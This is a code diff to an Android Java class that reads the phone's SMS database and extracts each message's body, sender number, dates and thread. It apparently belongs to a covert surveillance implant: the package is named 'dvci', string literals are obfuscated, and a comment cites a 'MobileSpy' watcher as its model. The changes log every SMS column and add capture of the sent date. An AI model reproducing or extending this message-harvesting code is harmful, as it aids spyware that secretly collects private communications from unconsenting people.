@@ -10,9 +10,11 @@
 package com.android.dvci.module.message;
 
 import java.util.ArrayList;
+import java.util.Date;
 
 import android.database.Cursor;
 import android.net.Uri;
+import android.util.Log;
 
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
@@ -38,7 +40,6 @@ public class SmsBrowser {
 
 		// cambiamento!
 		// https://gbandroid.googlecode.com/svn-history/r46/trunk/MobileSpy/src/org/ddth/android/monitor/observer/AndroidSmsWatcher.java
-
 		maxId = parse(M.e("content://sms"), lastManagedId); //$NON-NLS-1$
 
 		return list;
@@ -79,12 +80,20 @@ public class SmsBrowser {
 					continue;
 				}
 
+				for (int clms = 0; clms < c.getColumnCount(); clms++) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (columns), " +c.getColumnName(clms) + " : " + c.getString(clms));
+					}
+				}
+
 				localMaxId = Math.max(localMaxId, id);
-				printColumnsSms(c);
+				//printColumnsSms(c);
 
 				body = c.getString(c.getColumnIndexOrThrow(M.e("body"))).toString(); //$NON-NLS-1$
 				number = c.getString(c.getColumnIndexOrThrow(M.e("address"))).toString(); //$NON-NLS-1$
+
 				date = c.getLong(c.getColumnIndexOrThrow(M.e("date"))); //$NON-NLS-1$
+
 				int type = c.getInt(c.getColumnIndexOrThrow("type"));
 
 				sentStatus = type == MESSAGE_TYPE_SENT;
@@ -107,6 +116,19 @@ public class SmsBrowser {
 			try {
 				final String thread_id = c.getString(c.getColumnIndexOrThrow(M.e("thread_id"))); //$NON-NLS-1$
 				s.setThreadId(thread_id);
+			} catch (final Exception e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
+				}
+			}
+
+			try {
+				final long date_sent = c.getLong(c.getColumnIndexOrThrow(M.e("date_sent"))); //$NON-NLS-1$
+				s.setDateSent(date_sent);
 			} catch (final Exception e) {
 				if (Cfg.EXCEPTION) {
 					Check.log(e);
@@ -186,7 +208,8 @@ public class SmsBrowser {
 			list.add(s);
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (parse) end, localMaxId: " + localMaxId);
+				Check.log(TAG + " (parse) end: " + localMaxId);
+				Check.log(TAG + " (parse) date: " + new Date(s.getDate()));
 			}
 
 		}
